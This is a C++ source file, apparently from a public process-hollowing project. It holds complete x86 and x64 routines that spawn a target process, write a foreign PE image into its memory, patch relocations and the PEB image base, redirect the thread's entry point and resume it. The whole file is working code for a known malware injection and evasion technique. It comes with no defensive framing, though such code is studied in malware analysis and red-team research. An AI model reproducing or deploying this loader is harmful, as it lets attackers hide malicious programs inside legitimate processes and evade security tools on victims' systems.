/*
* Github: https://github.com/adamhlt/Process-Hollowing
*/

#include "process_hollowing.h"


LPSTR lpSourceImage;
LPSTR lpTargetProcess;


/**
 * Function to check if the image is a valid PE file.
 * \param lpImage : PE image data.
 * \return : TRUE if the image is a valid PE else no.
 */
BOOL IsValidPE(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	if (lpImageNTHeader->Signature == IMAGE_NT_SIGNATURE)
		return TRUE;

	return FALSE;
}

/**
 * Function to check if the image is a x86 executable.
 * \param lpImage : PE image data.
 * \return : TRUE if the image is x86 else FALSE.
 */
BOOL IsPE32(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	if (lpImageNTHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
		return TRUE;

	return FALSE;
}

/**
 * Function to retrieve the PEB address and image base address of the target process x86.
 * \param lpPI : pointer to the process infromation.
 * \return : if it is failed both address are nullptr.
 */
ProcessAddressInformation GetProcessAddressInformation32(const PPROCESS_INFORMATION lpPI)
{
	LPVOID lpImageBaseAddress = nullptr;
	WOW64_CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;
	Wow64GetThreadContext(lpPI->hThread, &CTX);
	const BOOL bReadBaseAddress = ReadProcessMemory(lpPI->hProcess, (LPVOID)(uintptr_t)(CTX.Ebx + 0x8), &lpImageBaseAddress, sizeof(DWORD), nullptr);
	if (!bReadBaseAddress)
		return ProcessAddressInformation{ nullptr, nullptr };

	return ProcessAddressInformation{ (LPVOID)(uintptr_t)CTX.Ebx, lpImageBaseAddress };
}

/**
 * Function to retrieve the PEB address and image base address of the target process x64.
 * \param lpPI : pointer to the process infromation.
 * \return : if it is failed both address are nullptr.
 */
ProcessAddressInformation GetProcessAddressInformation64(const PPROCESS_INFORMATION lpPI)
{
	LPVOID lpImageBaseAddress = nullptr;
	CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;
	GetThreadContext(lpPI->hThread, &CTX);
	const BOOL bReadBaseAddress = ReadProcessMemory(lpPI->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageBaseAddress, sizeof(UINT64), nullptr);
	if (!bReadBaseAddress)
		return ProcessAddressInformation{ nullptr, nullptr };

	return ProcessAddressInformation{ (LPVOID)CTX.Rdx, lpImageBaseAddress };
}

/**
 * Function to retrieve the subsystem of a PE image x86.
 * \param lpImage : data of the PE image.
 * \return : the subsystem charateristics.
 */
DWORD GetSubsytem32(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	return lpImageNTHeader->OptionalHeader.Subsystem;
}

/**
 * Function to retrieve the subsystem of a PE image x64.
 * \param lpImage : data of the PE image.
 * \return : the subsystem charateristics.
 */
DWORD GetSubsytem64(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	return lpImageNTHeader->OptionalHeader.Subsystem;
}

/**
 * Function to retrieve the subsytem of a process x86.
 * \param hProcess : handle of the process.
 * \param lpImageBaseAddress : image base address of the process.
 * \return : the process subsystem charateristics.
 */
DWORD GetSubsystemEx32(const HANDLE hProcess, const LPVOID lpImageBaseAddress)
{
	constexpr IMAGE_DOS_HEADER ImageDOSHeader = {};
	const BOOL bGetDOSHeader = ReadProcessMemory(hProcess, lpImageBaseAddress, (LPVOID)&ImageDOSHeader, sizeof(IMAGE_DOS_HEADER), nullptr);
	if (!bGetDOSHeader)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to get the target DOS header.\n");
#endif
		return -1;
	}

	constexpr IMAGE_NT_HEADERS32 ImageNTHeader = {};
	const BOOL bGetNTHeader = ReadProcessMemory(hProcess, (LPVOID)((uintptr_t)lpImageBaseAddress + ImageDOSHeader.e_lfanew), (LPVOID)&ImageNTHeader, sizeof(IMAGE_NT_HEADERS32), nullptr);
	if (!bGetNTHeader)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to get the target NT header.\n");
#endif
		return -1;
	}

	return ImageNTHeader.OptionalHeader.Subsystem;
}

/**
 * Function to retrieve the subsytem of a process x64.
 * \param hProcess : handle of the process.
 * \param lpImageBaseAddress : image base address of the process.
 * \return : the process subsystem charateristics.
 */
DWORD GetSubsystemEx64(const HANDLE hProcess, const LPVOID lpImageBaseAddress)
{
	constexpr IMAGE_DOS_HEADER ImageDOSHeader = {};
	const BOOL bGetDOSHeader = ReadProcessMemory(hProcess, lpImageBaseAddress, (LPVOID)&ImageDOSHeader, sizeof(IMAGE_DOS_HEADER), nullptr);
	if (!bGetDOSHeader)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to get the target DOS header.\n");
#endif
		return -1;
	}

	constexpr IMAGE_NT_HEADERS64 ImageNTHeader = {};
	const BOOL bGetNTHeader = ReadProcessMemory(hProcess, (LPVOID)((uintptr_t)lpImageBaseAddress + ImageDOSHeader.e_lfanew), (LPVOID)&ImageNTHeader, sizeof(IMAGE_NT_HEADERS64), nullptr);
	if (!bGetNTHeader)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to get the target NT header.\n");
#endif
		return -1;
	}

	return ImageNTHeader.OptionalHeader.Subsystem;
}

/**
 * Function to clean and exit target process.
 * \param lpPI : pointer to PROCESS_INFORMATION of the target process.
 * \param hFileContent : handle of the source image content.
 */
void CleanAndExitProcess(const LPPROCESS_INFORMATION lpPI)
{
	if (lpPI->hThread != nullptr)
		CloseHandle(lpPI->hThread);

	if (lpPI->hProcess != nullptr)
	{
		TerminateProcess(lpPI->hProcess, -1);
		CloseHandle(lpPI->hProcess);
	}
}

/**
 * Function to clean the target process.
 * \param lpPI : pointer to PROCESS_INFORMATION of the target process.
 * \param hFileContent : handle of the source image content.
 */
void CleanProcess(const LPPROCESS_INFORMATION lpPI)
{
	if (lpPI->hThread != nullptr)
		CloseHandle(lpPI->hThread);

	if (lpPI->hProcess != nullptr)
		CloseHandle(lpPI->hProcess);
}

/**
 * Function to check if the source image has a relocation table x86.
 * \param lpImage : content of the source image.
 * \return : TRUE if the image has a relocation table else FALSE.
 */
BOOL HasRelocation32(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
		return TRUE;

	return FALSE;
}

/**
 * Function to check if the source image has a relocation table x64.
 * \param lpImage : content of the source image.
 * \return : TRUE if the image has a relocation table else FALSE.
 */
BOOL HasRelocation64(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
		return TRUE;

	return FALSE;
}

/**
 * Function to retrieve the IMAGE_DATA_DIRECTORY reloc of a x86 image.
 * \param lpImage : PE source image.
 * \return : 0 if fail else the data directory.
 */
IMAGE_DATA_DIRECTORY GetRelocAddress32(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
		return lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	return { 0, 0 };
}

/**
 * Function to retrieve the IMAGE_DATA_DIRECTORY reloc of a x64 image.
 * \param lpImage : PE source image.
 * \return : 0 if fail else the data directory.
 */
IMAGE_DATA_DIRECTORY GetRelocAddress64(const LPVOID lpImage)
{
	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
	if (lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
		return lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	return { 0, 0 };
}

/**
 * Function to write the new PE image and resume the process thread x86.
 * \param lpPI : pointer to the process informations structure.
 * \param lpImage : content of the new image.
 * \return : TRUE if the PE run succesfully else FALSE.
 */
BOOL RunPE32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
{
	LPVOID lpAllocAddress;

	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader32 = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

	lpAllocAddress = VirtualAllocEx(lpPI->hProcess, (LPVOID)(uintptr_t)lpImageNTHeader32->OptionalHeader.ImageBase, lpImageNTHeader32->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpAllocAddress == nullptr)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to allocate memory for the new image.\n");
#endif
		return FALSE;
	}

#ifdef DEBUG
	printf("[+] Memory allocate at : 0x%p\n", (LPVOID)(uintptr_t)lpAllocAddress);
#endif

	const BOOL bWriteHeaders = WriteProcessMemory(lpPI->hProcess, lpAllocAddress, (LPVOID)lpImage, lpImageNTHeader32->OptionalHeader.SizeOfHeaders, nullptr);
	if (!bWriteHeaders)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to write the headers of the new image.\n");
#endif
		return FALSE;
	}

#ifdef DEBUG
	printf("[+] Headers write at : 0x%p\n", (LPVOID)(DWORD64)lpImageNTHeader32->OptionalHeader.ImageBase);
#endif

	for (int i = 0; i < lpImageNTHeader32->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader32 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader32->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		const BOOL bWriteSection = WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((uintptr_t)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
		if (!bWriteSection)
		{
#ifdef DEBUG
			printf("[-] An error is occured when trying to write the section : %s.\n", (LPSTR)lpImageSectionHeader->Name);
#endif
			return FALSE;
		}

#ifdef DEBUG
		printf("[+] Section %s write at : 0x%p.\n", (LPSTR)lpImageSectionHeader->Name, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress));
#endif
	}

	WOW64_CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	const BOOL bGetContext = Wow64GetThreadContext(lpPI->hThread, &CTX);
	if (!bGetContext)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to get the thread context.\n");
#endif
		return FALSE;
	}

	const BOOL bWritePEB = WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)CTX.Ebx + 0x8), &lpImageNTHeader32->OptionalHeader.ImageBase, sizeof(DWORD), nullptr);
	if (!bWritePEB)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to write the image base in the PEB.\n");
#endif
		return FALSE;
	}

	CTX.Eax = (DWORD)((uintptr_t)lpAllocAddress + lpImageNTHeader32->OptionalHeader.AddressOfEntryPoint);

	const BOOL bSetContext = Wow64SetThreadContext(lpPI->hThread, &CTX);
	if (!bSetContext)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to set the thread context.\n");
#endif
		return FALSE;
	}

	ResumeThread(lpPI->hThread);

	return TRUE;
}

/**
 * Function to write the new PE image and resume the process thread x64.
 * \param lpPI : pointer to the process informations structure.
 * \param lpImage : content of the new image.
 * \return : TRUE if the PE run succesfully else FALSE.
 */
BOOL RunPE64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
{
	LPVOID lpAllocAddress;

	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader64 = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

	lpAllocAddress = VirtualAllocEx(lpPI->hProcess, (LPVOID)lpImageNTHeader64->OptionalHeader.ImageBase, lpImageNTHeader64->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpAllocAddress == nullptr)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to allocate memory for the new image.\n");
#endif
		return FALSE;
	}

#ifdef DEBUG
	printf("[+] Memory allocate at : 0x%p\n", (LPVOID)(uintptr_t)lpAllocAddress);
#endif

	const BOOL bWriteHeaders = WriteProcessMemory(lpPI->hProcess, lpAllocAddress, lpImage, lpImageNTHeader64->OptionalHeader.SizeOfHeaders, nullptr);
	if (!bWriteHeaders)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to write the headers of the new image.\n");
#endif
		return FALSE;
	}

#ifdef DEBUG
	printf("[+] Headers write at : 0x%p\n", (LPVOID)lpImageNTHeader64->OptionalHeader.ImageBase);
#endif

	for (int i = 0; i < lpImageNTHeader64->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader64 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader64->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		const BOOL bWriteSection = WriteProcessMemory(lpPI->hProcess, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((UINT64)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
		if (!bWriteSection)
		{
#ifdef DEBUG
			printf("[-] An error is occured when trying to write the section : %s.\n", (LPSTR)lpImageSectionHeader->Name);
#endif
			return FALSE;
		}

#ifdef DEBUG
		printf("[+] Section %s write at : 0x%p.\n", (LPSTR)lpImageSectionHeader->Name, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress));
#endif
	}

	CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	const BOOL bGetContext = GetThreadContext(lpPI->hThread, &CTX);
	if (!bGetContext)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to get the thread context.\n");
#endif
		return FALSE;
	}

	const BOOL bWritePEB = WriteProcessMemory(lpPI->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageNTHeader64->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr);
	if (!bWritePEB)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to write the image base in the PEB.\n");
#endif
		return FALSE;
	}

	CTX.Rcx = (DWORD64)lpAllocAddress + lpImageNTHeader64->OptionalHeader.AddressOfEntryPoint;

	const BOOL bSetContext = SetThreadContext(lpPI->hThread, &CTX);
	if (!bSetContext)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to set the thread context.\n");
#endif
		return FALSE;
	}

	ResumeThread(lpPI->hThread);

	return TRUE;
}

/**
 * Function to fix relocation table and write the new PE image and resume the process thread x86.
 * \param lpPI : pointer to the process informations structure.
 * \param lpImage : content of the new image.
 * \return : TRUE if the PE run succesfully else FALSE.
 */
BOOL RunPEReloc32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
{
	LPVOID lpAllocAddress;

	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader32 = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

	lpAllocAddress = VirtualAllocEx(lpPI->hProcess, nullptr, lpImageNTHeader32->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpAllocAddress == nullptr)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to allocate memory for the new image.\n");
#endif
		return FALSE;
	}

#ifdef DEBUG
	printf("[+] Memory allocate at : 0x%p\n", (LPVOID)(uintptr_t)lpAllocAddress);
#endif

	const DWORD DeltaImageBase = (DWORD64)lpAllocAddress - lpImageNTHeader32->OptionalHeader.ImageBase;

	lpImageNTHeader32->OptionalHeader.ImageBase = (DWORD64)lpAllocAddress;
	const BOOL bWriteHeaders = WriteProcessMemory(lpPI->hProcess, lpAllocAddress, lpImage, lpImageNTHeader32->OptionalHeader.SizeOfHeaders, nullptr);
	if (!bWriteHeaders)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to write the headers of the new image.\n");
#endif
		return FALSE;
	}

#ifdef DEBUG
	printf("[+] Headers write at : 0x%p\n", lpAllocAddress);
#endif

	const IMAGE_DATA_DIRECTORY ImageDataReloc = GetRelocAddress32(lpImage);
	PIMAGE_SECTION_HEADER lpImageRelocSection = nullptr;

	for (int i = 0; i < lpImageNTHeader32->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader32 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader32->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		if (ImageDataReloc.VirtualAddress >= lpImageSectionHeader->VirtualAddress && ImageDataReloc.VirtualAddress < (lpImageSectionHeader->VirtualAddress + lpImageSectionHeader->Misc.VirtualSize))
			lpImageRelocSection = lpImageSectionHeader;

		const BOOL bWriteSection = WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((uintptr_t)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
		if (!bWriteSection)
		{
#ifdef DEBUG
			printf("[-] An error is occured when trying to write the section : %s.\n", (LPSTR)lpImageSectionHeader->Name);
#endif
			return FALSE;
		}

#ifdef DEBUG
		printf("[+] Section %s write at : 0x%p.\n", (LPSTR)lpImageSectionHeader->Name, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress));
#endif
	}

	if (lpImageRelocSection == nullptr)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to get the relocation section of the source image.\n");
#endif
		return FALSE;
	}

#ifdef DEBUG
	printf("[+] Relocation section : %s\n", (char*)lpImageRelocSection->Name);
#endif

	DWORD RelocOffset = 0;

	while (RelocOffset < ImageDataReloc.Size)
	{
		const auto lpImageBaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD64)lpImage + lpImageRelocSection->PointerToRawData + RelocOffset);
		RelocOffset += sizeof(IMAGE_BASE_RELOCATION);
		const DWORD NumberOfEntries = (lpImageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_ENTRY);
		for (DWORD i = 0; i < NumberOfEntries; i++)
		{
			const auto lpImageRelocationEntry = (PIMAGE_RELOCATION_ENTRY)((DWORD64)lpImage + lpImageRelocSection->PointerToRawData + RelocOffset);
			RelocOffset += sizeof(IMAGE_RELOCATION_ENTRY);

			if (lpImageRelocationEntry->Type == 0)
				continue;

			const DWORD64 AddressLocation = (DWORD64)lpAllocAddress + lpImageBaseRelocation->VirtualAddress + lpImageRelocationEntry->Offset;
			DWORD PatchedAddress = 0;

			ReadProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD), nullptr);

			PatchedAddress += DeltaImageBase;

			WriteProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD), nullptr);

		}
	}

#ifdef DEBUG
	printf("[+] Relocations done.\n");
#endif

	WOW64_CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	const BOOL bGetContext = Wow64GetThreadContext(lpPI->hThread, &CTX);
	if (!bGetContext)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to get the thread context.\n");
#endif
		return FALSE;
	}

	const BOOL bWritePEB = WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)CTX.Ebx + 0x8), &lpAllocAddress, sizeof(DWORD), nullptr);
	if (!bWritePEB)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to write the image base in the PEB.\n");
#endif
		return FALSE;
	}

	CTX.Eax = (DWORD)((uintptr_t)lpAllocAddress + lpImageNTHeader32->OptionalHeader.AddressOfEntryPoint);

	const BOOL bSetContext = Wow64SetThreadContext(lpPI->hThread, &CTX);
	if (!bSetContext)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to set the thread context.\n");
#endif
		return FALSE;
	}

	ResumeThread(lpPI->hThread);

	return TRUE;
}

/**
 * Function to fix relocation table and write the new PE image and resume the process thread x64.
 * \param lpPI : pointer to the process informations structure.
 * \param lpImage : content of the new image.
 * \return : TRUE if the PE run succesfully else FALSE.
 */
BOOL RunPEReloc64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage)
{
	LPVOID lpAllocAddress;

	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
	const auto lpImageNTHeader64 = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

	lpAllocAddress = VirtualAllocEx(lpPI->hProcess, nullptr, lpImageNTHeader64->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpAllocAddress == nullptr)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to allocate memory for the new image.\n");
#endif
		return FALSE;
	}

#ifdef DEBUG
	printf("[+] Memory allocate at : 0x%p\n", (LPVOID)(uintptr_t)lpAllocAddress);
#endif

	const DWORD64 DeltaImageBase = (DWORD64)lpAllocAddress - lpImageNTHeader64->OptionalHeader.ImageBase;

	lpImageNTHeader64->OptionalHeader.ImageBase = (DWORD64)lpAllocAddress;
	const BOOL bWriteHeaders = WriteProcessMemory(lpPI->hProcess, lpAllocAddress, lpImage, lpImageNTHeader64->OptionalHeader.SizeOfHeaders, nullptr);
	if (!bWriteHeaders)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to write the headers of the new image.\n");
#endif
		return FALSE;
	}

#ifdef DEBUG
	printf("[+] Headers write at : 0x%p\n", lpAllocAddress);
#endif

	const IMAGE_DATA_DIRECTORY ImageDataReloc = GetRelocAddress64(lpImage);
	PIMAGE_SECTION_HEADER lpImageRelocSection = nullptr;

	for (int i = 0; i < lpImageNTHeader64->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader64 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader64->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		if (ImageDataReloc.VirtualAddress >= lpImageSectionHeader->VirtualAddress && ImageDataReloc.VirtualAddress < (lpImageSectionHeader->VirtualAddress + lpImageSectionHeader->Misc.VirtualSize))
			lpImageRelocSection = lpImageSectionHeader;


		const BOOL bWriteSection = WriteProcessMemory(lpPI->hProcess, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((UINT64)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
		if (!bWriteSection)
		{
#ifdef DEBUG
			printf("[-] An error is occured when trying to write the section : %s.\n", (LPSTR)lpImageSectionHeader->Name);
#endif
			return FALSE;
		}

#ifdef DEBUG
		printf("[+] Section %s write at : 0x%p.\n", (LPSTR)lpImageSectionHeader->Name, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress));
#endif
	}

	if (lpImageRelocSection == nullptr)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to get the relocation section of the source image.\n");
#endif
		return FALSE;
	}

#ifdef DEBUG
	printf("[+] Relocation section : %s\n", (char*)lpImageRelocSection->Name);
#endif

	DWORD RelocOffset = 0;

	while (RelocOffset < ImageDataReloc.Size)
	{
		const auto lpImageBaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD64)lpImage + lpImageRelocSection->PointerToRawData + RelocOffset);
		RelocOffset += sizeof(IMAGE_BASE_RELOCATION);
		const DWORD NumberOfEntries = (lpImageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_ENTRY);
		for (DWORD i = 0; i < NumberOfEntries; i++)
		{
			const auto lpImageRelocationEntry = (PIMAGE_RELOCATION_ENTRY)((DWORD64)lpImage + lpImageRelocSection->PointerToRawData + RelocOffset);
			RelocOffset += sizeof(IMAGE_RELOCATION_ENTRY);

			if (lpImageRelocationEntry->Type == 0)
				continue;

			const DWORD64 AddressLocation = (DWORD64)lpAllocAddress + lpImageBaseRelocation->VirtualAddress + lpImageRelocationEntry->Offset;
			DWORD64 PatchedAddress = 0;

			ReadProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), nullptr);

			PatchedAddress += DeltaImageBase;

			WriteProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), nullptr);

		}
	}

#ifdef DEBUG
	printf("[+] Relocations done.\n");
#endif

	CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	const BOOL bGetContext = GetThreadContext(lpPI->hThread, &CTX);
	if (!bGetContext)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to get the thread context.\n");
#endif
		return FALSE;
	}

	const BOOL bWritePEB = WriteProcessMemory(lpPI->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageNTHeader64->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr);
	if (!bWritePEB)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to write the image base in the PEB.\n");
#endif
		return FALSE;
	}

	CTX.Rcx = (DWORD64)lpAllocAddress + lpImageNTHeader64->OptionalHeader.AddressOfEntryPoint;

	const BOOL bSetContext = SetThreadContext(lpPI->hThread, &CTX);
	if (!bSetContext)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to set the thread context.\n");
#endif
		return FALSE;
	}

	ResumeThread(lpPI->hThread);

	return TRUE;
}
